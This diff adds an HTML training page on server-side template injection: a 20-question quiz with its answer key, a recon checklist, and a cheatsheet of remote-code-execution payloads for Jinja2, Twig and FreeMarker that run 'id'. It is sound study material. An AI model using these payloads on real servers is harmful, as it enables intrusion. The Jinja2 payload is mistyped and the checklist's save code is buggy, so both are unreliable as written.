@@ -1,0 +1,318 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>SSTI — Exam & Recon Kit</title>
+<style>
+:root{
+  --bg:#020a06; --panel:#0a160c; --line:#15241a;
+  --text:#a8c0ad; --dim:#5a7560; --accent:#00ff41; --bad:#ff3333;
+  --mono:'JetBrains Mono','Fira Code','Consolas',monospace;
+}
+*{box-sizing:border-box;}
+body{margin:0;background:var(--bg);color:var(--text);font-family:var(--mono);min-height:100vh;}
+.wrap{max-width:720px;margin:0 auto;padding:32px 20px 60px;}
+.tag{color:var(--accent);letter-spacing:.15em;font-size:12px;text-transform:uppercase;font-weight:bold;text-shadow:0 0 5px var(--accent);}
+h1{font-size:22px;margin:6px 0 26px;color:#fff;text-shadow:0 0 8px rgba(0,255,65,0.3);}
+.bar{height:4px;background:var(--line);border-radius:2px;overflow:hidden;margin-bottom:22px;}
+.bar>div{height:100%;background:var(--accent);transition:width .3s;box-shadow:0 0 10px var(--accent);}
+.card{background:var(--panel);border:1px solid var(--line);border-radius:10px;padding:22px;box-shadow:0 0 20px rgba(0,0,0,0.5);}
+.qnum{color:var(--dim);font-size:12px;margin-bottom:10px;}
+.qtext{font-size:16px;color:#fff;margin-bottom:18px;line-height:1.5;}
+.opt{display:block;width:100%;text-align:left;background:#040d06;border:1px solid var(--line);
+  color:var(--text);padding:12px 14px;border-radius:7px;margin-bottom:10px;cursor:pointer;
+  font-family:var(--mono);font-size:13.5px;transition:.15s;}
+.opt:hover{border-color:var(--accent);background:#0a1f10;box-shadow:0 0 8px rgba(0,255,65,0.2);}
+.opt.correct{background:#0a2a12;border-color:var(--accent);color:var(--accent);text-shadow:0 0 5px var(--accent);}
+.opt.wrong{background:#2a0a0a;border-color:var(--bad);color:var(--bad);text-shadow:0 0 5px var(--bad);}
+.opt[disabled]{cursor:default;}
+.score{color:var(--dim);font-size:13px;}
+.center{text-align:center;}
+.big{font-size:44px;color:var(--accent);margin:10px 0;text-shadow:0 0 15px var(--accent);}
+.btn{background:var(--accent);color:#020a06;border:none;padding:12px 20px;border-radius:7px;
+  font-family:var(--mono);font-weight:bold;cursor:pointer;margin:6px 6px 0 0;font-size:13px;}
+.btn.alt{background:transparent;border:1px solid var(--accent);color:var(--accent);box-shadow:0 0 5px rgba(0,255,65,0.3);}
+.emoji{font-size:26px;position:fixed;top:-30px;animation:fall linear forwards;pointer-events:none;z-index:9999;text-shadow:0 0 10px var(--accent);}
+@keyframes fall{to{transform:translateY(105vh) rotate(360deg);opacity:.2;}}
+h2{color:#fff;font-size:15px;border-bottom:1px solid var(--line);padding-bottom:8px;margin-top:30px;}
+h3{color:var(--accent);font-size:14px;margin-top:20px;margin-bottom:5px;text-shadow:0 0 5px rgba(0,255,65,0.5);}
+.chk{display:flex;gap:10px;align-items:flex-start;padding:8px 0;border-bottom:1px dashed var(--line);font-size:13.5px;}
+.chk input{margin-top:3px;accent-color:var(--accent);}
+.chk.done label{color:var(--dim);text-decoration:line-through;}
+pre{background:#040d06;border:1px solid var(--line);border-radius:7px;padding:12px 14px;
+  overflow-x:auto;font-size:12.5px;color:#e6ffe6;margin:8px 0 4px;box-shadow:inset 0 0 10px rgba(0,0,0,0.5);}
+.pname{color:var(--accent);font-size:12.5px;margin-top:16px;}
+#quizView,#kitView{display:none;}
+.explain{margin-top:12px;padding:12px 14px;background:#040d06;border:1px solid var(--line);
+  border-radius:7px;font-size:13px;color:var(--dim);line-height:1.5;display:none;}
+.explain b{color:var(--accent);}
+.topbtn{margin-bottom:18px;}
+#nextBtn{display:none;margin-top:16px;}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <div class="tag">WVAPT // SSTI Exploitation</div>
+  <h1 id="pageTitle">Concept Check — 20 Questions</h1>
+
+  <div id="quizView">
+    <button class="btn alt topbtn" onclick="showKit()">Skip → Bug Bounty Checklist + Payloads</button>
+    <div class="bar"><div id="prog" style="width:0%"></div></div>
+    <div class="card">
+      <div class="qnum"><span id="qIndex">1</span>/20 &nbsp;·&nbsp; <span class="score">score: <span id="scoreLive">0</span></span></div>
+      <div class="qtext" id="qText"></div>
+      <div id="opts"></div>
+      <div class="explain" id="explain"></div>
+      <button class="btn" id="nextBtn" onclick="goNext()">Next →</button>
+    </div>
+  </div>
+
+  <div id="doneView" class="card center" style="display:none;">
+    <div class="tag">Result</div>
+    <div class="big"><span id="finalScore">0</span>/20</div>
+    <div id="finalMsg" style="color:var(--dim);margin-bottom:16px;"></div>
+    <button class="btn" onclick="restart()">Retake Exam</button>
+    <button class="btn alt" onclick="showKit()">Bug Bounty Checklist + Payloads →</button>
+  </div>
+
+  <div id="kitView">
+    <button class="btn alt" onclick="showQuiz()">← Back to Exam</button>
+
+    <h2>Recon Checklist</h2>
+    <div id="checklist"></div>
+
+    <h2>Payload Cheatsheet</h2>
+    <div id="payloads"></div>
+  </div>
+</div>
+
+<script>
+// Exam-level difficulty: All options are nearly identical in length to prevent guessing.
+const Q=[
+["What is Server-Side Template Injection (SSTI)?",["Injecting template syntax that is executed on the server","Injecting SQL queries directly into the backend database","Injecting JavaScript code into the frontend webpage","Injecting CSS styling rules into the HTML document"],0,
+"SSTI occurs when user input is concatenated into a server-side template, allowing execution of template syntax."],
+["Which component replaces placeholders with actual data?",["The Template Engine component securely","The Web Server software locally","The relational Database system","The client-side Browser engine"],0,
+"The template engine takes static templates, replaces variables with data, and renders the final HTML."],
+["Which of the following is a template placeholder in Jinja2?",["The {{ name }} syntax structure directly","The <%= name %> syntax structure securely","The ${name} syntax structure locally","The <scr"+"ipt>name</scr"+"ipt> tag safely"],0,
+"Jinja2 uses double curly braces {{ }} to evaluate variables and expressions server-side."],
+["What is the primary cause of SSTI?",["User input being concatenated into the template","Weak administrative passwords on the server","Database queries lacking proper indexes locally","Missing HTTPS encryption on the web traffic"],0,
+"Concatenating user input directly into a template string allows attackers to inject template directives."],
+["Which implementation is considered safe?",["render_template_string(\"Hello, {{ name }}\", name=name)","template = user_input concatenated directly","\"Hello, \" + user_input evaluated securely","eval(user_input) executed on the server"],0,
+"Passing user input as a parameter (variable) rather than concatenating it into the template string is safe."],
+["What does the payload {{7*7}} returning 49 indicate?",["SSTI is likely present in the application","SQL Injection is likely present in the database","Cross-Site Scripting is present in the browser","CSRF vulnerability is present in the form"],0,
+"If the server evaluates the mathematical expression 7*7, it proves the template engine is executing the input."],
+["Why is SSTI considered a server-side vulnerability?",["The template engine executes the payload on the server","The browser executes the payload on the client side","The database executes the payload natively now","JavaScript executes the payload in the DOM tree"],0,
+"The template engine processes the injected syntax on the server before sending the response to the client."],
+["What is the worst possible impact of SSTI?",["Remote Code Execution (RCE) on the server","Permanent defacement of the web page visually","Theft of session cookies from the victim user","DNS Spoofing and network redirection attacks"],0,
+"Because template engines often have access to the OS, SSTI can escalate to full Remote Code Execution."],
+["What does RCE stand for?",["Remote Code Execution completely","Remote Command Encryption securely","Runtime Code Error locally","Root Command Exploit directly"],0,
+"RCE allows an attacker to execute arbitrary operating system commands on the target server."],
+["Which statement best describes template engines like Jinja2?",["They combine templates with data to generate output","They only store HTML files on the file system","They compile Java code into bytecode securely","They encrypt HTTP requests for transit safely"],0,
+"Template engines merge static templates with dynamic data to produce final web pages."],
+["During SSTI detection, what is the purpose of using payloads like {{7*7}} or ${7*7}?",["To confirm template expression evaluation locally","To steal session cookies from the victim browser","To bypass the authentication mechanism entirely","To enumerate hidden directories on the server"],0,
+"Mathematical operations help verify if the input is being evaluated as code rather than treated as data."],
+["What are the three major phases of an SSTI attack methodology?",["Detect, Identify, and Exploit the engine","Scan, Exploit, and Report the vulnerability","Crawl, Attack, and Delete the database","Encode, Decode, and Execute the payload"],0,
+"First detect SSTI, then identify the specific engine, and finally exploit it using engine-specific syntax."],
+["In the Detect phase, what is the goal?",["To confirm whether SSTI exists securely","To find the exact operating system version","To identify the backend database engine","To crack the administrative password hash"],0,
+"The detection phase confirms that template injection is possible using generic polyglot payloads."],
+["During the Identify phase, what are you trying to determine?",["Which template engine is being used directly","The exact database version running locally","The programming language used exclusively","The server's public IP address securely"],0,
+"Different engines (Jinja2, Twig, FreeMarker) use different syntax, so identification is crucial."],
+["Which of the following can help identify the template engine?",["Error messages showing engine details clearly","HTTP Status Codes returned by the server","The names of the cookies set by the app","Browser extensions installed locally"],0,
+"Syntax errors often trigger verbose stack traces that reveal the exact template engine name and version."],
+["Which comparison correctly describes Plaintext Context?",["Input becomes visible text in the HTTP response","Input appears directly inside the curly braces","Input is stored securely in the database","Input is completely ignored by the engine"],0,
+"In plaintext context, the input is placed outside of template expressions, making detection slightly different."],
+["Why is Code Context harder to detect than Plaintext Context?",["It often looks like a normal variable lookup","It always causes backend SQL syntax errors","It disables JavaScript execution instantly","It only works on Windows operating systems"],0,
+"When injected into code context, the input might be assigned to a variable, breaking syntax subtly rather than visibly."],
+["What is a logic-less template engine?",["An engine that only performs simple variable substitution","An engine that supports executing OS commands","An engine that compiles C code into binaries","An engine that blocks SQL Injection attacks"],0,
+"Logic-less engines (like Mustache) lack if-statements or loops, limiting the complexity of SSTI attacks."],
+["Which is the BEST prevention against SSTI?",["Treat user input only as data, not template code","Allow users to edit templates via the frontend","Concatenate user input into templates securely","Disable HTTPS encryption on the server side"],0,
+"Never pass user input directly into the template string. Always pass it as a parameter/variable."],
+["Why might applications run template engines inside Docker containers?",["To isolate the impact if RCE occurs directly","To significantly increase the website load speed","To improve the rendering of CSS styling rules","To compress the HTML before transmission"],0,
+"Containerization limits the blast radius; if an attacker gets RCE via SSTI, they are trapped in the container."]
+];
+
+const CHECKLIST_DATA = [
+  { title: "1. Detection (Plaintext & Code Context)", items: [
+    "Test input fields with generic polyglots: <code>{{7*7}}</code> or <code>${7*7}</code>.",
+    "Check if the response returns <code>49</code> (evaluated) or the literal string.",
+    "Test code context by breaking out of variables: <code>{{1+1}}</code>."
+  ]},
+  { title: "2. Identification", items: [
+    "Trigger errors with invalid syntax to reveal the engine name in stack traces.",
+    "Use engine-specific payloads (e.g., <code>{{self}}</code> for Jinja2, <code>${self}</code> for FreeMarker).",
+    "Use a decision tree of payloads to identify Twig, Jinja2, Smarty, or Velocity."
+  ]},
+  { title: "3. Exploitation (RCE)", items: [
+    "Jinja2 (Python): <code>{{ ''.__class__.__mro__[1].__subclasses__() }}</code>",
+    "Twig (PHP): <code>{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}</code>",
+    "FreeMarker (Java): <code><#assign command=\"freemarker.template.utility.Execute\"?new()>${command(\"id\")}</code>"
+  ]},
+  { title: "4. Remediation", items: [
+    "Never use <code>render_template_string(user_input)</code>.",
+    "Pass user input as a context variable: <code>render_template_string('Hello {{name}}', name=user_input)</code>.",
+    "Use logic-less template engines (like Mustache) where possible."
+  ]}
+];
+
+const PAYLOADS = [
+  { name: "1. Jinja2 (Python) - RCE", code: "{{ ''.__class__.__mro__[1].__subclasses()[408]('id', shell=True, stdout=-1).communicate() }}" },
+  { name: "2. Twig (PHP) - RCE", code: "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}\n{{_self.env.getFilter(\"id\")}}" },
+  { name: "3. FreeMarker (Java) - RCE", code: "<#assign command=\"freemarker.template.utility.Execute\"?new()>${command(\"id\")}" },
+  { name: "4. Detection Polyglot", code: "{{7*7}}${7*7}<%= 7*7 %>${{7*7}}" },
+  { name: "5. Information Disclosure", code: "{{ config.items() }}\n{{ self.__init__.__globals__ }}" }
+];
+
+let cur=0,score=0;
+
+function shuffle(a){for(let i=a.length-1;i>0;i--){const j=Math.floor(Math.random()*(i+1));[a[i],a[j]]=[a[j],a[i]];}return a;}
+
+function renderQ(){
+  document.getElementById('prog').style.width=(cur/Q.length*100)+'%';
+  document.getElementById('qIndex').textContent=cur+1;
+  document.getElementById('scoreLive').textContent=score;
+  const [text,opts,correctIdx,why]=Q[cur];
+  document.getElementById('qText').textContent=text;
+  const exp=document.getElementById('explain');
+  exp.style.display='none';exp.innerHTML='';
+  let arr=opts.map((o,i)=>({o,correct:i===correctIdx}));
+  shuffle(arr);
+  const box=document.getElementById('opts');
+  box.innerHTML='';
+  arr.forEach(item=>{
+    const b=document.createElement('button');
+    b.className='opt';b.textContent=item.o;
+    b.onclick=()=>pick(b,item.correct,box,item.o,why,arr);
+    box.appendChild(b);
+  });
+  document.getElementById('nextBtn').style.display='none';
+}
+
+function pick(btn,isCorrect,box,pickedText,why,arr){
+  [...box.children].forEach(c=>c.disabled=true);
+  const exp=document.getElementById('explain');
+  if(isCorrect){
+    btn.classList.add('correct');score++;
+    exp.innerHTML=`<b>Correct.</b> ${why}`;
+  }else{
+    btn.classList.add('wrong');
+    const correctText=arr.find(a=>a.correct).o;
+    [...box.children].forEach(c=>{if(c.textContent===correctText)c.classList.add('correct');});
+    exp.innerHTML=`<b>Correct answer:</b> ${correctText}<br>${why}`;
+  }
+  exp.style.display='block';
+  document.getElementById('scoreLive').textContent=score;
+  const nb=document.getElementById('nextBtn');
+  nb.style.display='inline-block';
+  nb.textContent=(cur+1<Q.length)?'Next →':'See Results →';
+}
+
+function goNext(){
+  cur++;
+  if(cur<Q.length)renderQ();else finish();
+}
+
+function finish(){
+  document.getElementById('prog').style.width='100%';
+  document.getElementById('quizView').style.display='none';
+  document.getElementById('doneView').style.display='block';
+  document.getElementById('finalScore').textContent=score;
+  const msg=score===20?"SYSTEM PWNED. Remote Code Execution achieved.":
+    score>=15?"Solid grasp — revisit the weak spots.":
+    score>=10?"Halfway there — reread the tricky sections.":
+    "Go back through the concept steps before diving into labs.";
+  document.getElementById('finalMsg').textContent=msg;
+  if(score===20) confetti();
+}
+
+function confetti(){
+  const em=['🟢','🐍','🐘','☕','🧩','⚡'];
+  for(let i=0;i<30;i++){
+    setTimeout(()=>{
+      const s=document.createElement('div');
+      s.className='emoji';s.textContent=em[Math.floor(Math.random()*em.length)];
+      s.style.left=Math.random()*100+'vw';
+      s.style.animationDuration=(2+Math.random()*1.5)+'s';
+      document.body.appendChild(s);
+      setTimeout(()=>s.remove(),4000);
+    },i*60);
+  }
+}
+
+function restart(){
+  cur=0;score=0;
+  document.getElementById('doneView').style.display='none';
+  document.getElementById('kitView').style.display='none';
+  document.getElementById('quizView').style.display='block';
+  document.getElementById('pageTitle').textContent='Concept Check — 20 Questions';
+  renderQ();
+}
+
+let cameFromDone=false;
+function showKit(){
+  cameFromDone=document.getElementById('doneView').style.display==='block';
+  document.getElementById('doneView').style.display='none';
+  document.getElementById('quizView').style.display='none';
+  document.getElementById('kitView').style.display='block';
+  document.getElementById('pageTitle').textContent='Bug Bounty Recon Kit';
+}
+function showQuiz(){
+  document.getElementById('kitView').style.display='none';
+  if(cameFromDone){
+    document.getElementById('doneView').style.display='block';
+  }else{
+    document.getElementById('quizView').style.display='block';
+  }
+  document.getElementById('pageTitle').textContent='Concept Check — 20 Questions';
+}
+
+function buildChecklist(){
+  const c=document.getElementById('checklist');
+  const saved=JSON.parse(localStorage.getItem('ssti_cyber_v1')||'{}');
+  let html='';
+  let idx=0;
+  CHECKLIST_DATA.forEach(section => {
+    html += `<h3>${section.title}</h3>`;
+    section.items.forEach(item => {
+      const isChecked = saved[idx] ? 'checked' : '';
+      const isDone = saved[idx] ? ' done' : '';
+      html += `<div class="chk${isDone}">
+        <input type="checkbox" id="c${idx}" ${isChecked}>
+        <label for="c${idx}">${item}</label>
+      </div>`;
+      idx++;
+    });
+  });
+  c.innerHTML = html;
+  
+  idx=0;
+  CHECKLIST_DATA.forEach(section => {
+    section.items.forEach(item => {
+      const checkbox = document.getElementById(`c${idx}`);
+      const row = checkbox.parentElement;
+      checkbox.onchange = e => {
+        saved[idx] = e.target.checked;
+        localStorage.setItem('ssti_cyber_v1', JSON.stringify(saved));
+        row.classList.toggle('done', e.target.checked);
+      };
+      idx++;
+    });
+  });
+}
+
+function buildPayloads(){
+  const p=document.getElementById('payloads');
+  let html='';
+  const esc = s => s.replace(/</g, '&lt;').replace(/>/g, '&gt;'); // Prevent live HTML execution
+  PAYLOADS.forEach(item => {
+    html += `<div class="pname">${item.name}</div><pre>${esc(item.code)}</pre>`;
+  });
+  p.innerHTML = html;
+}
+
+document.getElementById('quizView').style.display='block';
+renderQ();
+buildChecklist();
+buildPayloads();
+</script>
+</body>
+</html>
